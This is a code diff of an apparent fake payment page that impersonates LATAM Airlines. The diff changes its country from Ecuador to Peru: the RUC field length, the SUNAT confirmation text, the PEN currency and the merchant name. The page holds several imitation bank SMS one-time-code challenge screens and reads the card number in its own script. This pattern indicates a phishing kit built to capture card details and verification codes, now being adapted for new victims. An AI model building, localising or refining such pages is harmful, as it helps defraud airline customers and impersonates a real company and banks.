@@ -219,7 +219,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
           </svg>
         </span>
         <ul>
-          <li>Factura válida para personas y empresas inscritas en Ecuador.</li>
+          <li>Factura válida para personas y empresas inscritas en Perú.</li>
           <li>Para justificar costos o gastos, ingresar el RUC, de lo contrario el documento tendrá validez de boleta de venta.</li>
           <li>Aplica un solo RUC para toda la compra.</li>
         </ul>
@@ -232,12 +232,12 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         </label>
         <label class="pagos-card-input">
           <span class="pagos-sr-only">RUC</span>
-          <input type="text" name="invoiceRuc" inputmode="numeric" placeholder="RUC" maxlength="13" />
+          <input type="text" name="invoiceRuc" inputmode="numeric" placeholder="RUC" maxlength="11" />
         </label>
         <label class="pagos-card-input pagos-card-input--select">
           <span class="pagos-sr-only">País</span>
           <select name="invoiceCountry" aria-label="País" disabled>
-            <option value="EC" selected>Ecuador</option>
+            <option value="PE" selected>Perú</option>
           </select>
         </label>
         <label class="pagos-card-input">
@@ -253,7 +253,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
 
       <label class="pagos-invoice__confirm">
         <input type="checkbox" id="pagos-invoice-confirm" name="invoiceConfirm" />
-        <span>Confirmo que los datos son correctos y que coinciden con los del Servicio de Rentas Internas de Ecuador.</span>
+        <span>Confirmo que los datos son correctos y que coinciden con los de SUNAT.</span>
       </label>
     </div>
   </div>
@@ -269,7 +269,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         </a>
       </span>
     </label>
-    <button type="button" class="pagos-pay" id="pagos-pay" disabled>{copy.payPrefix} USD 0,00</button>
+    <button type="button" class="pagos-pay" id="pagos-pay" disabled>{copy.payPrefix} PEN 0,00</button>
   </div>
 
   <p class="pagos-msg" id="pagos-msg" hidden></p>
@@ -355,8 +355,8 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
         <p>Enviado a su número registrado en el banco.</p>
         <div class="pasarela-card__box">
-          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Ecuador</strong></p>
-          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Perú</strong></p>
+          <p>Monto: <strong data-challenge-amount>PEN 0,00</strong></p>
           <p>Fecha: <span data-challenge-datetime></span></p>
         </div>
       </div>
@@ -387,8 +387,8 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
         <p>Enviado a su número registrado en el banco.</p>
         <div class="pasarela-card__box">
-          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Ecuador</strong></p>
-          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Perú</strong></p>
+          <p>Monto: <strong data-challenge-amount>PEN 0,00</strong></p>
           <p>Fecha: <span data-challenge-datetime></span></p>
         </div>
       </div>
@@ -412,8 +412,8 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
         <p>Enviado a su número registrado en el banco.</p>
         <div class="pasarela-card__box">
-          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Ecuador</strong></p>
-          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Perú</strong></p>
+          <p>Monto: <strong data-challenge-amount>PEN 0,00</strong></p>
           <p>Fecha: <span data-challenge-datetime></span></p>
         </div>
       </div>
@@ -443,8 +443,8 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
         <p>Enviado a su número registrado en el banco.</p>
         <div class="pasarela-card__box">
-          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Ecuador</strong></p>
-          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Perú</strong></p>
+          <p>Monto: <strong data-challenge-amount>PEN 0,00</strong></p>
           <p>Fecha: <span data-challenge-datetime></span></p>
         </div>
       </div>
@@ -469,8 +469,8 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
           <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
           <p>Enviado a su número registrado en el banco.</p>
           <div class="pasarela-card__box pasarela-card__box--plain">
-            <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Ecuador</strong></p>
-            <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+            <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Perú</strong></p>
+            <p>Monto: <strong data-challenge-amount>PEN 0,00</strong></p>
             <p>Fecha: <span data-challenge-datetime></span></p>
           </div>
         </div>
@@ -667,10 +667,10 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     if (withError) setChallengeMessage(brandKey, withError);
   }
 
-  function money(value, withUsd = false) {
+  function money(value, withPen = false) {
     const n = Number(value || 0);
     const formatted = n.toFixed(2).replace('.', ',');
-    return withUsd ? `USD\u00a0${formatted}` : `$${formatted}`;
+    return withPen ? `PEN\u00a0${formatted}` : `S/\u00a0${formatted}`;
   }
 
   function ticketAfterDiscount(original) {
@@ -1199,7 +1199,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     const timeLabel = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
     const datetimeLabel = `${dateLabel} · ${timeLabel}`;
     const amountLabel = money(total, true);
-    const merchantLabel = 'LATAM Airlines Ecuador';
+    const merchantLabel = 'LATAM Airlines Perú';
     const payLabel = payBtn.textContent;
     const cardDigits = onlyDigits(cardNumber?.value || '');
 
